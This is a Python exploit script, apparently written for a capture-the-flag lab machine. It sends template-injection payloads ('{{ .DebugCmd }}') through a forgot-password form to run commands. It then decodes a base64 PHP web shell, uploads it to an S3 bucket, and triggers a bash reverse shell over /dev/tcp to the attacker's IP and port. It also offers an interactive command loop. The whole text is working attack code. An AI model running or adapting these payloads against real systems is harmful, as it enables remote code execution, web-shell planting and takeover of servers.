import urllib.parse
import urllib.parse
import requests,re,base64

machine_ip = "10.10.11.113"

your_ip = '10.10.16.8'
yout_port = 9999

def send_cmd(cmd):
    burp0_url = f"http://{machine_ip}:8080/forgot/"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.10.11.113:8080", "Connection": "keep-alive", "Referer": "http://10.10.11.113:8080/forgot/", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}
    burp0_data = {"email": "{{ .DebugCmd \"cmd\" }}".replace('cmd',cmd)}
    response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies={'http':'http://localhost:8080'})
    return response


def enumerate():
    while True:
        cmd = input("Insert cmd: ")
        session = requests.session()

        response = send_cmd(cmd)
        print(extract(response))

def extract(response):
    # Use regex to extract text strictly between </label> and <button class="btn btn-pr
    match = re.search(r"</label>\s*\n(.*?)\n\s*<button class=\"btn btn-pr", response.text, re.DOTALL)
    # Use regex to extract text strictly between </label> and <button class="btn btn-pr
    match = re.search(r"</label>\s*\n(.*?)\n\s*<button class=\"btn btn-pr", response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()  # Extract and clean up text
        print("Extracted Text:")
        print("----------------")
        return extracted_text
    else:
        return ("No matching text found.")
    

def exploit():
    cmd1 = f"echo -n {base64.b64encode(b"<?php system($_GET['cmd'])?>").decode()} | base64 -d > shell.php"
    cmd2 = f"aws s3 cp shell.php s3://website/shell.php"

    send_cmd(cmd1)
    send_cmd(cmd2)

    # reverse shell
    import urllib.parse
    rev = f"bash -c 'bash -i >& /dev/tcp/{your_ip}/{yout_port} 0>&1'"
    requests.get(f"http://{machine_ip}/shell.php?cmd={urllib.parse.quote(rev)}", proxies={"http":"http://localhost:8080"})

exploit()